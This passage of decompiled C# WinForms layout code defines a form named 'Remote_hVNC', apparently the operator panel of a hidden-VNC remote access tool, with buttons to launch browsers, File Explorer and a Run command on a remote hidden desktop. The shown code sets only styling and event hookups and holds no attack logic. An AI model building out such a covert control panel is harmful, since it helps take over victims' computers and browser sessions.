			btnPalemoon.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnPalemoon.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnPalemoon.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnPalemoon.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnPalemoon.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnPalemoon.DisabledState.Parent = btnPalemoon;
			btnPalemoon.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnPalemoon.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPalemoon.Font = new System.Drawing.Font("Electrolize", 9f);
			btnPalemoon.ForeColor = System.Drawing.Color.White;
			btnPalemoon.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnPalemoon.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnPalemoon.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPalemoon.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnPalemoon.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPalemoon.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnPalemoon.HoverState.Parent = btnPalemoon;
			btnPalemoon.Location = new System.Drawing.Point(8, 64);
			btnPalemoon.Name = "btnPalemoon";
			btnPalemoon.ShadowDecoration.Parent = btnPalemoon;
			btnPalemoon.Size = new System.Drawing.Size(147, 25);
			btnPalemoon.TabIndex = 149;
			btnPalemoon.Text = "Start PaleMoon";
			btnPalemoon.Click += new System.EventHandler(btnPaleMoon_Click);
			guna2GradientButton6.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			guna2GradientButton6.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton6.BorderThickness = 1;
			guna2GradientButton6.CheckedState.Parent = guna2GradientButton6;
			guna2GradientButton6.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton6.CustomImages.Parent = guna2GradientButton6;
			guna2GradientButton6.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton6.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton6.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton6.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton6.DisabledState.Parent = guna2GradientButton6;
			guna2GradientButton6.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton6.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton6.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton6.ForeColor = System.Drawing.Color.White;
			guna2GradientButton6.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton6.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton6.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton6.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton6.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton6.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton6.HoverState.Parent = guna2GradientButton6;
			guna2GradientButton6.Location = new System.Drawing.Point(314, 35);
			guna2GradientButton6.Name = "guna2GradientButton6";
			guna2GradientButton6.ShadowDecoration.Parent = guna2GradientButton6;
			guna2GradientButton6.Size = new System.Drawing.Size(147, 25);
			guna2GradientButton6.TabIndex = 148;
			guna2GradientButton6.Text = "Start WaterFox";
			guna2GradientButton6.Click += new System.EventHandler(btnWaterFor_Click);
			guna2GradientButton7.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			guna2GradientButton7.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton7.BorderThickness = 1;
			guna2GradientButton7.CheckedState.Parent = guna2GradientButton7;
			guna2GradientButton7.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton7.CustomImages.Parent = guna2GradientButton7;
			guna2GradientButton7.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton7.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton7.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton7.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton7.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton7.DisabledState.Parent = guna2GradientButton7;
			guna2GradientButton7.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton7.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton7.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton7.ForeColor = System.Drawing.Color.White;
			guna2GradientButton7.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton7.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton7.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton7.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton7.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton7.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton7.HoverState.Parent = guna2GradientButton7;
			guna2GradientButton7.Location = new System.Drawing.Point(314, 6);
			guna2GradientButton7.Name = "guna2GradientButton7";
			guna2GradientButton7.ShadowDecoration.Parent = guna2GradientButton7;
			guna2GradientButton7.Size = new System.Drawing.Size(147, 25);
			guna2GradientButton7.TabIndex = 147;
			guna2GradientButton7.Text = "Start IExplorer";
			guna2GradientButton7.Click += new System.EventHandler(btnIE_Click);
			guna2GradientButton4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2GradientButton4.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton4.BorderThickness = 1;
			guna2GradientButton4.CheckedState.Parent = guna2GradientButton4;
			guna2GradientButton4.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton4.CustomImages.Parent = guna2GradientButton4;
			guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton4.DisabledState.Parent = guna2GradientButton4;
			guna2GradientButton4.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton4.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton4.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton4.ForeColor = System.Drawing.Color.White;
			guna2GradientButton4.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton4.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton4.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton4.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton4.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton4.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton4.HoverState.Parent = guna2GradientButton4;
			guna2GradientButton4.Location = new System.Drawing.Point(845, 35);
			guna2GradientButton4.Name = "guna2GradientButton4";
			guna2GradientButton4.ShadowDecoration.Parent = guna2GradientButton4;
			guna2GradientButton4.Size = new System.Drawing.Size(147, 25);
			guna2GradientButton4.TabIndex = 146;
			guna2GradientButton4.Text = "Run";
			guna2GradientButton4.Click += new System.EventHandler(btnRun_Click);
			guna2GradientButton5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2GradientButton5.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton5.BorderThickness = 1;
			guna2GradientButton5.CheckedState.Parent = guna2GradientButton5;
			guna2GradientButton5.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton5.CustomImages.Parent = guna2GradientButton5;
			guna2GradientButton5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton5.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton5.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton5.DisabledState.Parent = guna2GradientButton5;
			guna2GradientButton5.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton5.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton5.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton5.ForeColor = System.Drawing.Color.White;
			guna2GradientButton5.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton5.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton5.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton5.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton5.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton5.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton5.HoverState.Parent = guna2GradientButton5;
			guna2GradientButton5.Location = new System.Drawing.Point(845, 6);
			guna2GradientButton5.Name = "guna2GradientButton5";
			guna2GradientButton5.ShadowDecoration.Parent = guna2GradientButton5;
			guna2GradientButton5.Size = new System.Drawing.Size(147, 25);
			guna2GradientButton5.TabIndex = 145;
			guna2GradientButton5.Text = "File Explorer";
			guna2GradientButton5.Click += new System.EventHandler(btnExplorer_Click);
			guna2GradientButton2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			guna2GradientButton2.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton2.BorderThickness = 1;
			guna2GradientButton2.CheckedState.Parent = guna2GradientButton2;
			guna2GradientButton2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton2.CustomImages.Parent = guna2GradientButton2;
			guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton2.DisabledState.Parent = guna2GradientButton2;
			guna2GradientButton2.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton2.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton2.ForeColor = System.Drawing.Color.White;
			guna2GradientButton2.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton2.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton2.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton2.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton2.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton2.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton2.HoverState.Parent = guna2GradientButton2;
			guna2GradientButton2.Location = new System.Drawing.Point(161, 35);
			guna2GradientButton2.Name = "guna2GradientButton2";
			guna2GradientButton2.ShadowDecoration.Parent = guna2GradientButton2;
			guna2GradientButton2.Size = new System.Drawing.Size(147, 25);
			guna2GradientButton2.TabIndex = 144;
			guna2GradientButton2.Text = "Start Brave";
			guna2GradientButton2.Click += new System.EventHandler(btnBrave_Click);
			guna2GradientButton3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			guna2GradientButton3.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton3.BorderThickness = 1;
			guna2GradientButton3.CheckedState.Parent = guna2GradientButton3;
			guna2GradientButton3.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton3.CustomImages.Parent = guna2GradientButton3;
			guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton3.DisabledState.Parent = guna2GradientButton3;
			guna2GradientButton3.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton3.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton3.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton3.ForeColor = System.Drawing.Color.White;
			guna2GradientButton3.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton3.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton3.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton3.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton3.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton3.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton3.HoverState.Parent = guna2GradientButton3;
			guna2GradientButton3.Location = new System.Drawing.Point(161, 6);
			guna2GradientButton3.Name = "guna2GradientButton3";
			guna2GradientButton3.ShadowDecoration.Parent = guna2GradientButton3;
			guna2GradientButton3.Size = new System.Drawing.Size(147, 25);
			guna2GradientButton3.TabIndex = 143;
			guna2GradientButton3.Text = "Start Edge";
			guna2GradientButton3.Click += new System.EventHandler(btnEdge_Click);
			guna2GradientButton1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			guna2GradientButton1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton1.BorderThickness = 1;
			guna2GradientButton1.CheckedState.Parent = guna2GradientButton1;
			guna2GradientButton1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton1.CustomImages.Parent = guna2GradientButton1;
			guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton1.DisabledState.Parent = guna2GradientButton1;
			guna2GradientButton1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton1.ForeColor = System.Drawing.Color.White;
			guna2GradientButton1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton1.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton1.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton1.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton1.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton1.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton1.HoverState.Parent = guna2GradientButton1;
			guna2GradientButton1.Location = new System.Drawing.Point(8, 35);
			guna2GradientButton1.Name = "guna2GradientButton1";
			guna2GradientButton1.ShadowDecoration.Parent = guna2GradientButton1;
			guna2GradientButton1.Size = new System.Drawing.Size(147, 25);
			guna2GradientButton1.TabIndex = 142;
			guna2GradientButton1.Text = "Start Firefox";
			guna2GradientButton1.Click += new System.EventHandler(btnFirefox_Click);
			btnStartL.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnStartL.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnStartL.BorderThickness = 1;
			btnStartL.CheckedState.Parent = btnStartL;
			btnStartL.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnStartL.CustomImages.Parent = btnStartL;
			btnStartL.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnStartL.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnStartL.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartL.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartL.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnStartL.DisabledState.Parent = btnStartL;
			btnStartL.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStartL.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStartL.Font = new System.Drawing.Font("Electrolize", 9f);
			btnStartL.ForeColor = System.Drawing.Color.White;
			btnStartL.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnStartL.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnStartL.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnStartL.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStartL.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStartL.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnStartL.HoverState.Parent = btnStartL;
			btnStartL.Location = new System.Drawing.Point(8, 6);
			btnStartL.Name = "btnStartL";
			btnStartL.ShadowDecoration.Parent = btnStartL;
			btnStartL.Size = new System.Drawing.Size(147, 25);
			btnStartL.TabIndex = 141;
			btnStartL.Text = "Start Chrome";
			btnStartL.Click += new System.EventHandler(btnChrome_Click);
			NumericUpDown.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			NumericUpDown.BackColor = System.Drawing.Color.Transparent;
			NumericUpDown.BorderColor = System.Drawing.Color.Red;
			NumericUpDown.Cursor = System.Windows.Forms.Cursors.IBeam;
			NumericUpDown.DisabledState.Parent = NumericUpDown;
			NumericUpDown.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			NumericUpDown.FocusedState.Parent = NumericUpDown;
			NumericUpDown.Font = new System.Drawing.Font("Segoe UI", 9f);
			NumericUpDown.ForeColor = System.Drawing.Color.LightGray;
			NumericUpDown.Location = new System.Drawing.Point(739, 35);
			NumericUpDown.Name = "NumericUpDown";
			NumericUpDown.ShadowDecoration.Parent = NumericUpDown;
			NumericUpDown.Size = new System.Drawing.Size(100, 25);
			NumericUpDown.TabIndex = 27;
			NumericUpDown.UpDownButtonFillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			NumericUpDown.UpDownButtonForeColor = System.Drawing.Color.White;
			NumericUpDown.Value = new decimal(new int[4] { 50, 0, 0, 0 });
			bunifuLabel2.AllowParentOverrides = false;
			bunifuLabel2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			bunifuLabel2.AutoEllipsis = false;
			bunifuLabel2.CursorType = null;
			bunifuLabel2.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			bunifuLabel2.ForeColor = System.Drawing.Color.Firebrick;
			bunifuLabel2.Location = new System.Drawing.Point(511, 6);
			bunifuLabel2.Name = "bunifuLabel2";
			bunifuLabel2.RightToLeft = System.Windows.Forms.RightToLeft.No;
			bunifuLabel2.Size = new System.Drawing.Size(288, 30);
			bunifuLabel2.TabIndex = 153;
			bunifuLabel2.Text = "Some buttons are disabled that means under heavy \r\ndevelopment,coming soon.\r\n";
			bunifuLabel2.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			bunifuLabel2.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			bunifuLabel1.AllowParentOverrides = false;
			bunifuLabel1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			bunifuLabel1.AutoEllipsis = false;
			bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
			bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
			bunifuLabel1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			bunifuLabel1.ForeColor = System.Drawing.Color.LightGray;
			bunifuLabel1.Location = new System.Drawing.Point(470, 63);
			bunifuLabel1.Name = "bunifuLabel1";
			bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
			bunifuLabel1.Size = new System.Drawing.Size(369, 30);
			bunifuLabel1.TabIndex = 10;
			bunifuLabel1.Text = "If you execute File Explorer, open the brobwers by selecting\r\nthe shortcut on desktop and press Enter button on your keyboard!";
			bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			picDesktop.Location = new System.Drawing.Point(0, 0);
			picDesktop.Name = "picDesktop";
			picDesktop.ShadowDecoration.Parent = picDesktop;
			picDesktop.Size = new System.Drawing.Size(300, 200);
			picDesktop.TabIndex = 0;
			picDesktop.TabStop = false;
			Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
			Panel2.Location = new System.Drawing.Point(0, 67);
			Panel2.Name = "Panel2";
			Panel2.ShadowDecoration.Parent = Panel2;
			Panel2.Size = new System.Drawing.Size(1000, 470);
			Panel2.TabIndex = 7;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2ShadowForm1.TargetForm = this;
			guna2ResizeForm1.TargetForm = this;
			picHVNC.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			picHVNC.BackgroundImage = (System.Drawing.Image)resources.GetObject("picHVNC.BackgroundImage");
			picHVNC.Cursor = System.Windows.Forms.Cursors.Default;
			picHVNC.Dock = System.Windows.Forms.DockStyle.Fill;
			picHVNC.GetImageSafe = null;
			picHVNC.Location = new System.Drawing.Point(0, 67);
			picHVNC.Name = "picHVNC";
			picHVNC.Running = false;
			picHVNC.Size = new System.Drawing.Size(1000, 470);
			picHVNC.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
			picHVNC.TabIndex = 0;
			picHVNC.TabStop = false;
			picHVNC.MouseDown += new System.Windows.Forms.MouseEventHandler(picHVNC_MouseDown);
			picHVNC.MouseMove += new System.Windows.Forms.MouseEventHandler(picHVNC_MouseMove);
			picHVNC.MouseUp += new System.Windows.Forms.MouseEventHandler(picHVNC_MouseUp);
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(36, 36, 36);
			base.ClientSize = new System.Drawing.Size(1000, 648);
			base.Controls.Add(picHVNC);
			base.Controls.Add(Panel2);
			base.Controls.Add(siticonePanel1);
			base.Controls.Add(panelTitleBar);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Remote_hVNC";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Remote_hVNC";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Remote_hVNC_FormClosed);
			base.Load += new System.EventHandler(Remote_hVNC_Load);
			panelTitleBar.ResumeLayout(false);
			panelTitleBar.PerformLayout();
			((System.ComponentModel.ISupportInitialize)picTitleIcon).EndInit();
			siticonePanel1.ResumeLayout(false);
			siticonePanel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)NumericUpDown).EndInit();
			((System.ComponentModel.ISupportInitialize)picDesktop).EndInit();
			((System.ComponentModel.ISupportInitialize)picHVNC).EndInit();
			ResumeLayout(false);
		}
	}
}